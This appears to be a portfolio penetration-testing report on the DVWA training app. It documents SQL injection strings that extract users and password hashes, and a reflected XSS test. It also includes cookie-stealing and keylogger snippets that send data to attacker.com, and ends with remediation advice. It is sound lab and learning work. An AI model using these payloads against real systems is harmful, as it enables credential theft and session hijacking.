# Penetration Testing Report - DVWA

> Comprehensive security assessment demonstrating SQL Injection and XSS exploitation techniques

[![Security Testing](https://img.shields.io/badge/Security-Penetration%20Testing-red)](https://github.com/Fredrickighile/penetration-testing-dvwa)
[![OWASP Top 10](https://img.shields.io/badge/OWASP-Top%2010-orange)](https://owasp.org/www-project-top-ten/)
[![Vulnerabilities Found](https://img.shields.io/badge/Critical%20Findings-2-critical)](https://github.com/Fredrickighile/penetration-testing-dvwa)

**Key Achievement:** Successfully identified and exploited critical SQL Injection and XSS vulnerabilities, demonstrating complete database compromise and client-side code execution.

[See Exploitation](#vulnerability-findings) • [Tools Used](#tools-used) • [What I Learned](#what-i-learned)

---

## Project Overview

This penetration testing assessment was conducted on DVWA (Damn Vulnerable Web Application) to identify and exploit common web vulnerabilities. The testing revealed critical security flaws that could lead to complete system compromise and unauthorized data access.

### Testing Objectives

- Identify SQL injection vulnerabilities in database queries
- Test for Cross-Site Scripting (XSS) attack vectors
- Demonstrate real-world exploitation techniques
- Document findings with visual proof-of-concept
- Provide actionable remediation recommendations

---

## Tools Used

| Tool              | Version           | Purpose                                                        |
| ----------------- | ----------------- | -------------------------------------------------------------- |
| **DVWA**          | Latest            | Intentionally vulnerable web application for security training |
| **XAMPP**         | 8.2.12            | Local web server environment (Apache + MySQL)                  |
| **Google Chrome** | Latest            | Manual testing and payload injection                           |
| **Burp Suite**    | Community Edition | HTTP request interception (planned for future testing)         |

---

## Methodology

### Step 1: Environment Setup

Set up a controlled testing environment using XAMPP to host DVWA locally.

**Setup:**

- Installed XAMPP on Windows 11
- Deployed DVWA to `C:\xampp\htdocs\dvwa`
- Configured MySQL database with root credentials
- Set DVWA security level to LOW for initial testing

### Step 2: Reconnaissance

Identified vulnerable input points and potential injection vectors.

**Target Areas:**

- SQL Injection module (`/vulnerabilities/sqli/`)
- XSS Reflected module (`/vulnerabilities/xss_r/`)

### Step 3: Vulnerability Testing

Systematically tested input fields using various injection payloads.

### Step 4: Exploitation & Documentation

Successfully exploited vulnerabilities and captured evidence of compromise.

---

## Vulnerability Findings

### Finding 1: SQL Injection (CRITICAL)

| Property       | Value                        |
| -------------- | ---------------------------- |
| **Severity**   | CRITICAL                     |
| **CVSS Score** | 9.8                          |
| **CWE**        | CWE-89                       |
| **Impact**     | Complete database compromise |

#### Technical Description

The application fails to sanitize user input in SQL queries, allowing attackers to manipulate database operations and extract sensitive information.

#### Exploitation Process

**Test 1: Baseline Query**

Input: `1`

Expected behavior: Returns user information for ID 1

![Normal SQL Query](screenshots/sql-normal.png)

**Test 2: Boolean-Based SQL Injection**

Input: `1' OR '1'='1`

Result: Bypassed query logic and extracted ALL users from the database

![SQL Injection Success - All Users](screenshots/sql-all-users.png)

**Successfully extracted:**

- admin / admin
- Gordon / Brown
- Hack / Me
- Pablo / Picasso
- Bob / Smith

**Test 3: Database Enumeration**

Input: `1' UNION SELECT NULL, database() #`

Result: Disclosed database name: `dvwa`

![Database Name Extraction](screenshots/sql-database-name.png)

**Test 4: Credential Extraction**

Input: `1' UNION SELECT user, password FROM users #`

Result: Successfully extracted usernames and MD5 password hashes

![Captured Credentials](screenshots/captured-credentials.png)

**Password hashes extracted:**

- `admin` → `5f4dcc3b5aa765d61d8327deb882cf99`
- `gordonb` → `e99a18c428cb38d5f260853678922e03`
- `1337` → `8d3533d75ae2c3966d7e0d4fcc69216b`
- `pablo` → `0d107d09f5bbe40cade3de5c71e9e9b7`
- `smithy` → `5f4dcc3b5aa765d61d8327deb882cf99`

#### Security Impact

| Impact Area              | Description                                             |
| ------------------------ | ------------------------------------------------------- |
| **Data Confidentiality** | All database contents can be read                       |
| **Data Integrity**       | Database records can be modified or deleted             |
| **Authentication**       | Login mechanisms can be bypassed                        |
| **Authorization**        | Privilege escalation to administrative access           |
| **Business Risk**        | Complete data breach, regulatory violations (GDPR/CCPA) |

---

### Finding 2: Cross-Site Scripting (XSS) - Reflected

| Property       | Value                               |
| -------------- | ----------------------------------- |
| **Severity**   | HIGH                                |
| **CVSS Score** | 7.3                                 |
| **CWE**        | CWE-79                              |
| **Impact**     | Session hijacking, phishing attacks |

#### Technical Description

User input is reflected in the HTTP response without proper encoding, allowing injection of malicious JavaScript that executes in victims' browsers.

#### Exploitation Process

**Initial State:**

![XSS Page Before Attack](screenshots/xss-before.png)

**Payload Injection:**

Input: `<script>alert('XSS Vulnerability!')</script>`

**Execution Result:**

The JavaScript successfully executed, proving arbitrary code execution in the browser context.

![XSS After Execution](screenshots/xss-after.png)

#### Attack Scenarios

**Session Hijacking:**

```javascript
<script>
  document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

**Keylogger:**

```javascript
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/log?key='+e.key);
}
</script>
```

**Phishing Redirect:**

```javascript
<script>window.location='http://fake-login-site.com';</script>
```

#### Security Impact

| Impact Area          | Description                                   |
| -------------------- | --------------------------------------------- |
| **Session Security** | Attackers can steal session tokens            |
| **User Privacy**     | Keystroke logging and screen capture possible |
| **Phishing**         | Users can be redirected to malicious sites    |
| **Malware**          | Drive-by downloads can be triggered           |
| **Business Risk**    | User account compromise, reputational damage  |

---

## Remediation Recommendations

### For SQL Injection

**Priority:** CRITICAL - Implement Immediately

**1. Use Prepared Statements**

```php
// Vulnerable Code
$query = "SELECT * FROM users WHERE user_id = '$id'";

// Secure Code
$stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

**2. Input Validation**

- Validate data types (ensure user_id is integer)
- Use allowlists for acceptable input patterns
- Implement server-side validation
- Reject input containing SQL keywords

**3. Principle of Least Privilege**

- Database accounts should have minimal permissions
- Separate read/write database users
- Disable dangerous SQL functions

**4. Web Application Firewall (WAF)**

- Deploy ModSecurity or similar WAF
- Block common SQL injection patterns
- Monitor and log suspicious queries

---

### For Cross-Site Scripting (XSS)

**Priority:** HIGH - Implement Within 7 Days

**1. Output Encoding**

```php
// Vulnerable Code
echo "Hello " . $_GET['name'];

// Secure Code
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

**2. Content Security Policy (CSP)**

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self'; object-src 'none';"
/>
```

**3. HTTPOnly Cookies**

```php
setcookie("session", $value, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

**4. Input Sanitization**

- Remove or encode special HTML characters
- Use input validation libraries
- Implement allowlist-based validation

---

## Risk Assessment

| Vulnerability   | Exploitability | Impact   | Overall Risk |
| --------------- | -------------- | -------- | ------------ |
| SQL Injection   | High           | Critical | CRITICAL     |
| XSS (Reflected) | Medium         | High     | HIGH         |

---

## What I Learned

Through this penetration testing exercise, I gained hands-on experience with:

- SQL injection identification and exploitation techniques
- Boolean-based and UNION-based SQL injection attacks
- Database enumeration and information disclosure
- Cross-Site Scripting (XSS) attack vectors and payloads
- Understanding OWASP Top 10 vulnerabilities in practice
- Professional penetration testing methodology
- Technical security report writing
- Risk assessment and severity classification
- Security remediation recommendations

---

## Key Takeaways

This assessment demonstrated:

1. **Input Validation is Critical** - Never trust user input, always validate and sanitize
2. **Defense in Depth** - Implement multiple security layers (WAF, input validation, output encoding)
3. **Prepared Statements are Essential** - They prevent SQL injection attacks effectively
4. **Output Encoding Prevents XSS** - Always encode user-generated content before display
5. **Security by Design** - Build security into applications from the beginning

---

## Future Improvements

- Test additional DVWA modules (Command Injection, File Upload, CSRF)
- Perform testing at higher security levels (Medium, High)
- Explore blind SQL injection techniques
- Test stored XSS vulnerabilities
- Integrate Burp Suite for automated scanning
- Develop custom exploit scripts

---

## Conclusion

This penetration test successfully identified and exploited **two critical security vulnerabilities** in DVWA:

1. **SQL Injection (CRITICAL):** Complete database compromise through unsanitized input, enabling credential theft and data exfiltration
2. **Cross-Site Scripting (HIGH):** Client-side code execution allowing session hijacking and phishing attacks

Both vulnerabilities demonstrate the critical importance of proper input validation and output encoding in web application security.

**Key Message:** Even simple input validation failures can lead to catastrophic security breaches. Implementing secure coding practices and regular security testing is essential for protecting web applications.

---

## Author

**Fredrick Ighile**  
Cybersecurity Specialist

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue)](https://linkedin.com/in/fredrick-ighile-968403280/)
[![GitHub](https://img.shields.io/badge/GitHub-Follow-black)](https://github.com/Fredrickighile)
[![Portfolio](https://img.shields.io/badge/Portfolio-Visit-green)](https://fredrick-ighile.vercel.app/)

**Contact:** fredrick.ighile.dev@gmail.com

**Date Completed:** January 11, 2026

---

<div align="center">

**If this project helped you understand penetration testing, please star this repository!**

[Back to Top](#penetration-testing-report---dvwa)

</div>
